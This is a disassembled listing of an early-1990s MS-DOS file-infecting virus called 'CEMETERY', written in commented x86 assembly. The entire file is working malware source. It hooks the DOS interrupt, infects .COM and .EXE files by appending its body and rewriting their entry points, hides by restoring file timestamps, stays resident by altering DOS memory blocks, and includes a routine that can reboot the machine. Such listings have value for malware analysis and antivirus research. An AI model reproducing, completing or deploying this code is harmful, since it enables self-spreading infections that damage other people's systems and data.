  
PAGE  60,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        CEMETERY			         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   4-Mar-91					         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e		equ	4Ch				; (0000:004C=31h)
data_2e		equ	4Eh				; (0000:004E=70h)
data_3e		equ	70h				; (0000:0070=0FF33h)
data_4e		equ	72h				; (0000:0072=0F000h)
data_5e		equ	84h				; (0000:0084=0E3h)
data_6e		equ	86h				; (0000:0086=161Ah)
data_7e		equ	90h				; (0000:0090=8Eh)
data_8e		equ	92h				; (0000:0092=1498h)
data_9e		equ	102h				; (0000:0102=0CC00h)
data_10e	equ	106h				; (0000:0106=326h)
data_11e	equ	450h				; (0000:0450=184Fh)
data_12e	equ	46Ch				; (0000:046C=0C4BCh)
data_13e	equ	46Eh				; (0000:046E=10h)
data_14e	equ	47Bh				; (0000:047B=0)
data_15e	equ	0				; (0326:0000=6A7h)
data_16e	equ	2				; (0326:0002=70h)
data_17e	equ	0				; (0687:0000=81h)
data_18e	equ	1				; (0688:0001=0FF17h)
data_19e	equ	2				; (06E3:0002=2342h)
data_20e	equ	6				; (06E3:0006=2344h)
data_46e	equ	0FBF0h				; (701E:FBF0=0)
data_47e	equ	0FBF2h				; (701E:FBF2=0)
data_48e	equ	0FC10h				; (701E:FC10=0)
data_49e	equ	0FC12h				; (701E:FC12=0)
data_50e	equ	0FC14h				; (701E:FC14=0)
data_51e	equ	0FC1Eh				; (701E:FC1E=0)
data_52e	equ	0FC20h				; (701E:FC20=0)
data_53e	equ	0FC26h				; (701E:FC26=0)
data_54e	equ	0FC28h				; (701E:FC28=0)
  
code_seg_a	segment
		assume	cs:code_seg_a, ds:code_seg_a
  
  
		org	100h
  
cemetery	proc	far
  
start:
data_21		dw	0CE9h
data_22		dw	0C304h
		db	23 dup (0C3h)
		db	'CEMETERY'
data_24		dw	0C3C3h
data_25		dw	0C3C3h
data_26		dw	0
data_27		dw	0
data_28		dw	0
data_29		dw	0
data_30		dw	0
data_31		dd	00000h
data_32		dw	0
data_33		dw	0
data_34		dd	00000h
data_35		dw	0
data_36		dw	0
		db	68h, 0E8h, 55h, 3, 90h, 3Dh
		db	4Dh, 4Bh, 75h, 9, 55h, 8Bh
		db	0ECh, 83h, 66h, 6, 0FEh, 5Dh
		db	0CFh, 80h, 0FCh, 4Bh, 74h, 12h
		db	3Dh, 0, 3Dh, 74h, 0Dh, 3Dh
		db	0, 6Ch, 75h, 5, 80h, 0FBh
		db	0, 74h, 3
loc_1:
		jmp	loc_13
loc_2:
		push	es
		push	ds
		push	di
		push	si
		push	bp
		push	dx
		push	cx
		push	bx
		push	ax
		call	sub_6
		call	sub_7
		cmp	ax,6C00h
		jne	loc_3				; Jump if not equal
		mov	dx,si
loc_3:
		mov	cx,80h
		mov	si,dx
  
locloop_4:
		inc	si
		mov	al,[si]
		or	al,al				; Zero ?
		loopnz	locloop_4			; Loop if zf=0, cx>0
  
		sub	si,2
		cmp	word ptr [si],4D4Fh
		je	loc_7				; Jump if equal
		cmp	word ptr [si],4558h
		je	loc_6				; Jump if equal
loc_5:
		jmp	short loc_12
		db	90h
loc_6:
		cmp	word ptr [si-2],452Eh
		nop
		jz	loc_8				; Jump if zero
		jmp	short loc_5
loc_7:
		cmp	word ptr [si-2],432Eh
		jne	loc_5				; Jump if not equal
		cmp	word ptr [si-4],444Eh
		jne	loc_5				; Jump if not equal
loc_8:
		mov	ax,3D02h
		call	sub_5
		jc	loc_12				; Jump if carry Set
		mov	bx,ax
		mov	ax,5700h
		call	sub_5
		mov	cs:data_27,cx			; (701E:0129=0)
		mov	cs:data_28,dx			; (701E:012B=0)
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		push	cs
		pop	ds
		mov	dx,103h
		mov	si,dx
		mov	cx,18h
		mov	ah,3Fh				; '?'
		call	sub_5
		jc	loc_10				; Jump if carry Set
		cmp	word ptr [si],5A4Dh
		jne	loc_9				; Jump if not equal
		call	sub_1
		jmp	short loc_10
loc_9:
		call	sub_4
loc_10:
		jc	loc_11				; Jump if carry Set
		mov	ax,5701h
		mov	cx,cs:data_27			; (701E:0129=0)
		mov	dx,cs:data_28			; (701E:012B=0)
		call	sub_5
loc_11:
		mov	ah,3Eh				; '>'
		call	sub_5
loc_12:
		call	sub_7
		pop	ax
		pop	bx
		pop	cx
		pop	dx
		pop	bp
		pop	si
		pop	di
		pop	ds
		pop	es
loc_13:
		jmp	cs:data_31			; (701E:0131=0)
  
cemetery	endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		mov	cx,[si+16h]
		add	cx,[si+8]
		mov	ax,10h
		mul	cx				; dx:ax = reg * ax
		add	ax,[si+14h]
		adc	dx,0
		push	dx
		push	ax
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		cmp	dx,0
		jne	loc_14				; Jump if not equal
		cmp	ax,589h
		jae	loc_14				; Jump if above or =
		pop	ax
		pop	dx
		stc					; Set carry flag
		ret
loc_14:
		mov	di,ax
		mov	bp,dx
		pop	cx
		sub	ax,cx
		pop	cx
		sbb	dx,cx
		cmp	word ptr [si+0Ch],0
		je	loc_ret_17			; Jump if equal
		cmp	dx,0
		jne	loc_15				; Jump if not equal
		cmp	ax,589h
		jne	loc_15				; Jump if not equal
		stc					; Set carry flag
		ret
loc_15:
		mov	dx,bp
		mov	ax,di
		push	dx
		push	ax
		add	ax,589h
		adc	dx,0
		mov	cx,200h
		div	cx				; ax,dx rem=dx:ax/reg
		les	di,dword ptr [si+2]		; Load 32 bit ptr
		mov	cs:data_29,di			; (701E:012D=0)
		mov	cs:data_30,es			; (701E:012F=0)
		mov	[si+2],dx
		cmp	dx,0
		je	loc_16				; Jump if equal
		inc	ax
loc_16:
		mov	[si+4],ax
		pop	ax
		pop	dx
		call	sub_2
		sub	ax,[si+8]
		les	di,dword ptr [si+14h]		; Load 32 bit ptr
		mov	data_24,di			; (701E:0123=0C3C3h)
		mov	data_25,es			; (701E:0125=0C3C3h)
		mov	[si+14h],dx
		mov	[si+16h],ax
		mov	word ptr data_26,ax		; (701E:0127=0)
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		call	sub_3
		jc	loc_ret_17			; Jump if carry Set
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		mov	ah,40h				; '@'
		mov	dx,si
		mov	cx,18h
		call	sub_5
  
loc_ret_17:
		ret
sub_1		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_2		proc	near
		mov	cx,4
		mov	di,ax
		and	di,0Fh
  
locloop_18:
		shr	dx,1				; Shift w/zeros fill
		rcr	ax,1				; Rotate thru carry
		loop	locloop_18			; Loop if cx > 0
  
		mov	dx,di
		ret
sub_2		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_3		proc	near
		mov	ah,40h				; '@'
		mov	cx,589h
		mov	dx,100h
		call	sub_6
		jmp	short loc_22
		db	90h
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_4:
		mov	ax,4202h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		cmp	ax,589h
		jb	loc_ret_21			; Jump if below
		cmp	ax,0FA00h
		jae	loc_ret_21			; Jump if above or =
		push	ax
		cmp	byte ptr [si],0E9h
		jne	loc_19				; Jump if not equal
		sub	ax,58Ch
		cmp	ax,[si+1]
		jne	loc_19				; Jump if not equal
		pop	ax
		stc					; Set carry flag
		ret
loc_19:
		call	sub_3
		jnc	loc_20				; Jump if carry=0
		pop	ax
		ret
loc_20:
		mov	ax,4200h
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		call	sub_5
		pop	ax
		sub	ax,3
		mov	dx,123h
		mov	si,dx
		mov	byte ptr cs:[si],0E9h
		mov	cs:[si+1],ax
		mov	ah,40h				; '@'
		mov	cx,3
		call	sub_5
  
loc_ret_21:
		ret
sub_3		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5		proc	near
loc_22:
		pushf					; Push flags
		call	cs:data_31			; (701E:0131=0)
		ret
sub_5		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		cli					; Disable interrupts
		les	ax,dword ptr ds:data_7e		; (0000:0090=18Eh) Load 32 bit ptr
		mov	cs:data_32,ax			; (701E:0135=0)
		mov	cs:data_33,es			; (701E:0137=0)
		mov	ax,3ABh
		mov	ds:data_7e,ax			; (0000:0090=18Eh)
		mov	ds:data_8e,cs			; (0000:0092=1498h)
		les	ax,dword ptr ds:data_1e		; (0000:004C=831h) Load 32 bit ptr
		mov	cs:data_35,ax			; (701E:013D=0)
		mov	cs:data_36,es			; (701E:013F=0)
		les	ax,cs:data_34			; (701E:0139=0) Load 32 bit ptr
		mov	ds:data_1e,ax			; (0000:004C=831h)
		mov	ds:data_2e,es			; (0000:004E=70h)
		sti					; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		ret
sub_6		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_7		proc	near
		push	ax
		push	ds
		push	es
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		cli					; Disable interrupts
		les	ax,dword ptr cs:data_32		; (701E:0135=0) Load 32 bit ptr
		mov	ds:data_7e,ax			; (0000:0090=18Eh)
		mov	ds:data_8e,es			; (0000:0092=1498h)
		les	ax,dword ptr cs:data_35		; (701E:013D=0) Load 32 bit ptr
		mov	ds:data_1e,ax			; (0000:004C=831h)
		mov	ds:data_2e,es			; (0000:004E=70h)
		sti					; Enable interrupts
		pop	es
		pop	ds
		pop	ax
		ret
sub_7		endp
  
		db	0B0h, 3, 0CFh, 50h, 53h, 51h
		db	2Eh, 0A3h, 0FEh, 3, 2Eh, 0A1h
		db	0F7h, 3, 0A3h, 50h, 4, 2Eh
		db	0A1h, 0F5h, 3, 8Ah, 0DCh, 0B4h
		db	9, 0B9h, 1, 0, 0CDh, 10h
		db	0E8h, 34h, 0, 0E8h, 0B7h, 0
		db	2Eh, 0A1h, 0F7h, 3, 0A3h, 50h
		db	4, 0B3h, 7, 0B8h, 7, 9
		db	0B9h, 1, 0, 0CDh, 10h, 2Eh
		db	0A1h, 0FEh, 3, 0A3h, 50h, 4
		db	7, 1Fh
		db	']_^ZY[X.'
		db	0FFh, 2Eh, 0FAh, 3
data_37		dw	0
data_38		db	10h
data_39		db	10h
data_40		db	0
data_41		dw	0
data_42		dw	0
		db	0, 0, 2Eh, 0A1h, 0F7h, 3
		db	8Bh, 1Eh, 4Ah, 4, 4Bh, 2Eh
		db	0F6h, 6, 0F9h, 3, 1, 74h
		db	0Ch, 3Ah, 0C3h, 72h, 12h, 2Eh
		db	80h, 36h, 0F9h, 3, 1, 0EBh
		db	0Ah
loc_23:
		cmp	al,0
		jg	loc_24				; Jump if >
		xor	byte ptr cs:data_40,1		; (701E:03F9=0)
loc_24:
		test	byte ptr cs:data_40,2		; (701E:03F9=0)
		jz	loc_25				; Jump if zero
		cmp	ah,18h
		jb	loc_26				; Jump if below
		xor	byte ptr cs:data_40,2		; (701E:03F9=0)
		jmp	short loc_26
loc_25:
		cmp	ah,0
		jg	loc_26				; Jump if >
		xor	byte ptr cs:data_40,2		; (701E:03F9=0)
loc_26:
		cmp	byte ptr cs:data_37,20h		; (701E:03F5=0) ' '
		je	loc_27				; Jump if equal
		db	2Eh
data_44		dw	3E80h
		db	0F8h, 3, 0, 74h, 6, 2Eh
		db	80h, 36h, 0F9h, 3, 2
loc_27:
		test	byte ptr cs:data_40,1		; (701E:03F9=0)
		jz	loc_28				; Jump if zero
		inc	cs:data_38			; (701E:03F7=10h)
		jmp	short loc_29
loc_28:
		dec	cs:data_38			; (701E:03F7=10h)
loc_29:
		test	byte ptr cs:data_40,2		; (701E:03F9=0)
		jz	loc_30				; Jump if zero
		inc	cs:data_39			; (701E:03F8=10h)
		jmp	short loc_ret_31
loc_30:
		dec	cs:data_39			; (701E:03F8=10h)
  
loc_ret_31:
		ret
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_8		proc	near
		mov	ax,word ptr cs:data_38		; (701E:03F7=1010h)
		mov	ds:data_11e,ax			; (0000:0450=184Fh)
		mov	bh,data_55			; (0000:0462=0D400h)
		mov	ah,8
		int	10h				; Video display   ah=functn 08h
							;  get char al & attrib ah @curs
		mov	cs:data_37,ax			; (701E:03F5=0)
		ret
sub_8		endp
  
		db	50h, 53h, 51h, 52h, 56h, 57h
		db	55h, 1Eh, 6, 33h, 0C0h, 50h
		db	1Fh, 81h, 3Eh, 70h, 0, 0AEh
		db	3, 74h, 35h, 0A1h, 6Ch, 4
		db	8Bh, 16h, 6Eh, 4, 0B9h, 0FFh
		db	0FFh, 0F7h, 0F1h, 3Dh, 10h, 0
		db	75h, 24h, 0FAh, 8Bh, 2Eh, 50h
		db	4, 0E8h, 0BEh, 0FFh, 89h, 2Eh
		db	50h, 4, 0C4h, 6, 70h, 0
		db	2Eh, 0A3h, 0FAh, 3, 2Eh, 8Ch
		db	6, 0FCh, 3, 0C7h, 6, 70h
		db	0, 0AEh, 3, 8Ch, 0Eh, 72h
		db	0, 0FBh
loc_32:
		mov	ah,2
		int	14h				; RS-232   dx=com1, ah=func 02h
							;  get char al, ah=return status
		cmp	al,31h				; '1'
		je	loc_33				; Jump if equal
		jnz	loc_34				; Jump if not zero
loc_33:
		int	19h				; Bootstrap loader
loc_34:
		pop	es
		pop	ds
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		ret
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_9		proc	near
		mov	dx,10h
		mul	dx				; dx:ax = reg * ax
		ret
sub_9		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_10		proc	near
		xor	ax,ax				; Zero register
		xor	bx,bx				; Zero register
		xor	cx,cx				; Zero register
		xor	dx,dx				; Zero register
		xor	si,si				; Zero register
		xor	di,di				; Zero register
		xor	bp,bp				; Zero register
		ret
sub_10		endp
  
		db	1Eh, 0E8h, 0, 0
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_11		proc	near
		mov	ax,4B4Dh
		int	21h				; DOS Services  ah=function 4Bh
							;  run progm @ds:dx, parm @es:bx
		jc	loc_35				; Jump if carry Set
		jmp	loc_45
loc_35:
		pop	si
		push	si
		mov	di,si
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		les	ax,dword ptr ds:data_1e		; (0000:004C=831h) Load 32 bit ptr
		mov	cs:data_53e[si],ax		; (701E:FC26=0)
		mov	cs:data_54e[si],es		; (701E:FC28=0)
		les	bx,dword ptr ds:data_5e		; (0000:0084=6E3h) Load 32 bit ptr
		mov	cs:data_51e[di],bx		; (701E:FC1E=0)
		mov	cs:data_52e[di],es		; (701E:FC20=0)
		mov	ax,ds:data_9e			; (0000:0102=0CC00h)
		cmp	ax,0F000h
		jne	loc_43				; Jump if not equal
		mov	dl,80h
		mov	ax,ds:data_10e			; (0000:0106=326h)
		cmp	ax,0F000h
		je	loc_36				; Jump if equal
		cmp	ah,0C8h
		jb	loc_43				; Jump if below
		cmp	ah,0F4h
		jae	loc_43				; Jump if above or =
		test	al,7Fh
		jnz	loc_43				; Jump if not zero
		mov	ds,ax
		cmp	word ptr ds:data_15e,0AA55h	; (0326:0000=6A7h)
		jne	loc_43				; Jump if not equal
		mov	dl,ds:data_16e			; (0326:0002=70h)
loc_36:
		mov	ds,ax
		xor	dh,dh				; Zero register
		mov	cl,9
		shl	dx,cl				; Shift w/zeros fill
		mov	cx,dx
		xor	si,si				; Zero register
  
locloop_37:
		lodsw					; String [si] to ax
		cmp	ax,0FA80h
		jne	loc_38				; Jump if not equal
		lodsw					; String [si] to ax
		cmp	ax,7380h
		je	loc_39				; Jump if equal
		jnz	loc_40				; Jump if not zero
loc_38:
		cmp	ax,0C2F6h
		jne	loc_41				; Jump if not equal
		lodsw					; String [si] to ax
		cmp	ax,7580h
		jne	loc_40				; Jump if not equal
loc_39:
		inc	si
		lodsw					; String [si] to ax
		cmp	ax,40CDh
		je	loc_42				; Jump if equal
		sub	si,3
loc_40:
		dec	si
		dec	si
loc_41:
		dec	si
		loop	locloop_37			; Loop if cx > 0
  
		jmp	short loc_43
loc_42:
		sub	si,7
		mov	cs:data_53e[di],si		; (701E:FC26=0)
		mov	cs:data_54e[di],ds		; (701E:FC28=0)
loc_43:
		mov	ah,62h				; 'b'
		int	21h				; DOS Services  ah=function 62h
							;  get progrm seg prefix addr bx
		mov	es,bx
		mov	ah,49h				; 'I'
		int	21h				; DOS Services  ah=function 49h
							;  release memory block, es=seg
		mov	bx,0FFFFh
		mov	ah,48h				; 'H'
		int	21h				; DOS Services  ah=function 48h
							;  allocate memory, bx=bytes/16
		sub	bx,5Ah
		nop
		jc	loc_45				; Jump if carry Set
		mov	cx,es
		stc					; Set carry flag
		adc	cx,bx
		mov	ah,4Ah				; 'J'
		int	21h				; DOS Services  ah=function 4Ah
							;  change mem allocation, bx=siz
		mov	bx,59h
		stc					; Set carry flag
		sbb	es:data_19e,bx			; (06E3:0002=2342h)
		push	es
		mov	es,cx
		mov	ah,4Ah				; 'J'
		int	21h				; DOS Services  ah=function 4Ah
							;  change mem allocation, bx=siz
		mov	ax,es
		dec	ax
		mov	ds,ax
		mov	word ptr ds:data_18e,8		; (0688:0001=0FF17h)
		call	sub_9
		mov	bx,ax
		mov	cx,dx
		pop	ds
		mov	ax,ds
		call	sub_9
		add	ax,ds:data_20e			; (06E3:0006=2344h)
		adc	dx,0
		sub	ax,bx
		sbb	dx,cx
		jc	loc_44				; Jump if carry Set
		sub	ds:data_20e,ax			; (06E3:0006=2344h)
loc_44:
		mov	si,di
		xor	di,di				; Zero register
		push	cs
		pop	ds
		sub	si,413h
		mov	cx,589h
		inc	cx
		rep	movsb				; Rep while cx>0 Mov [si] to es:[di]
		mov	ah,62h				; 'b'
		int	21h				; DOS Services  ah=function 62h
							;  get progrm seg prefix addr bx
		dec	bx
		mov	ds,bx
		mov	byte ptr ds:data_17e,5Ah	; (0687:0000=81h) 'Z'
		mov	dx,142h
		xor	ax,ax				; Zero register
		push	ax
		pop	ds
		mov	ax,es
		sub	ax,10h
		mov	es,ax
		cli					; Disable interrupts
		mov	ds:data_5e,dx			; (0000:0084=6E3h)
		mov	ds:data_6e,es			; (0000:0086=161Ah)
		sti					; Enable interrupts
		dec	byte ptr ds:data_14e		; (0000:047B=0)
loc_45:
		pop	si
		cmp	word ptr cs:data_46e[si],5A4Dh	; (701E:FBF0=0)
		jne	loc_46				; Jump if not equal
		pop	ds
		mov	ax,cs:data_50e[si]		; (701E:FC14=0)
		mov	bx,cs:data_49e[si]		; (701E:FC12=0)
		push	cs
		pop	cx
		sub	cx,ax
		add	cx,bx
		push	cx
		push	word ptr cs:data_48e[si]	; (701E:FC10=0)
		push	ds
		pop	es
		call	sub_10
		ret					; Return far
loc_46:
		pop	ax
		mov	ax,cs:data_46e[si]		; (701E:FBF0=0)
		mov	cs:data_21,ax			; (701E:0100=0CE9h)
		mov	ax,cs:data_47e[si]		; (701E:FBF2=0)
		mov	cs:data_22,ax			; (701E:0102=0C304h)
		mov	ax,100h
		push	ax
		push	cs
		pop	ds
		push	ds
		pop	es
		call	sub_10
		ret
sub_11		endp
  
  
code_seg_a	ends
  
  
  
		end	start
